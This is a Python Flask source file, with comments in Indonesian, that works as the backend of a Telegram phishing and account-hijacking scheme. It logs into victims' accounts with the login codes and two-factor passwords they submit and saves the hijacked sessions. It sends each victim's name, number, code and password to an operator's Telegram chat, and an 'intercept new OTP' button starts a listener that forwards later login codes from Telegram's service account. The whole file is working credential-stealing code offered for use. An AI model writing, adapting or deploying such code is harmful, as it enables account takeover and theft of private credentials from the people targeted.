import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

# Ambil Variabel Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
STATIC_URL = os.getenv("RAILWAY_STATIC_URL")
RAILWAY_URL = f"https://{STATIC_URL}" if STATIC_URL else None

# Database RAM (Penyimpanan Sesi)
user_db = {}

def bot_api(method, payload):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        res = requests.post(url, json=payload, timeout=15)
        return res.json()
    except: return {}

def set_webhook():
    if RAILWAY_URL:
        bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})

def normalisasi_nomor(nomor):
    num = re.sub(r'\D', '', nomor)
    if num.startswith('0'): num = '62' + num[1:]
    return '+' + num

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data: return jsonify({"status": "error"}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(handle_flow(data))
    except Exception as e:
        print(f"Error Register: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    finally:
        loop.close()

async def handle_flow(data):
    client = None
    try:
        step = int(data.get('step', 1))
        nomor = normalisasi_nomor(data.get('nomor', ''))
        nama = data.get('nama', 'User')
        
        if nomor not in user_db:
            user_db[nomor] = {"session": "", "hash": "", "nama": nama, "sandi": "None"}

        client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            res = await client.send_code_request(nomor)
            user_db[nomor].update({"hash": res.phone_code_hash, "session": client.session.save()})
            return jsonify({"status": "success"})

        elif step == 2:
            otp_masuk = data.get('otp')
            try:
                await client.sign_in(nomor, otp_masuk, phone_code_hash=user_db[nomor]['hash'])
                user_db[nomor]['session'] = client.session.save()
                # LAPORAN DATA MASUK (Sesuai Gambar 2)
                text = f"✅ **DATA MASUK**\n\nNama: {nama}\nNomor: {nomor}\nOTP: {otp_masuk}\nSandi: None"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": text, 
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "Sadap OTP Baru", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except errors.SessionPasswordNeededError:
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "need_2fa"})
            except Exception as e:
                return jsonify({"status": "error", "message": str(e)}), 400

        elif step == 3:
            sandi_2fa = data.get('sandi')
            await client.sign_in(password=sandi_2fa)
            user_db[nomor].update({"sandi": sandi_2fa, "session": client.session.save()})
            # Update Laporan dengan Sandi (OTP jadi None sesuai request)
            text = f"✅ **DATA MASUK (2FA)**\n\nNama: {nama}\nNomor: {nomor}\nOTP: None\nSandi: {sandi_2fa}"
            bot_api("sendMessage", {
                "chat_id": CHAT_ID, 
                "text": text, 
                "parse_mode": "Markdown",
                "reply_markup": {"inline_keyboard": [[{"text": "Sadap OTP Baru", "callback_data": f"upd_{nomor}"}]]}
            })
            return jsonify({"status": "success"})
    finally:
        if client: await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and "callback_query" in update:
        call = update["callback_query"]
        action, nomor = call["data"].split("_")
        
        if action == "upd":
            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "🔎 **Bot sedang mengintip...**\nSilakan minta kode baru di TurboTel/Telegraph."})
            threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
    return jsonify({"status": "success"})

async def monitor_otp(nomor):
    data = user_db.get(nomor)
    if not data or not data['session']: return
    
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    await client.connect()
    try:
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                # KIRIM HASIL SADAP LENGKAP
                text_sadap = f"🎯 **OTP SADAPAN BARU**\n\nNama: {data['nama']}\nNomor: {nomor}\nOTP Baru: `{otp.group(0)}`\nSandi: {data.get('sandi','None')}"
                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": text_sadap, "parse_mode": "Markdown"})
        
        await asyncio.wait_for(client.run_until_disconnected(), timeout=600)
    except: pass
    finally:
        if client.is_connected(): await client.disconnect()

if __name__ == "__main__":
    set_webhook()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
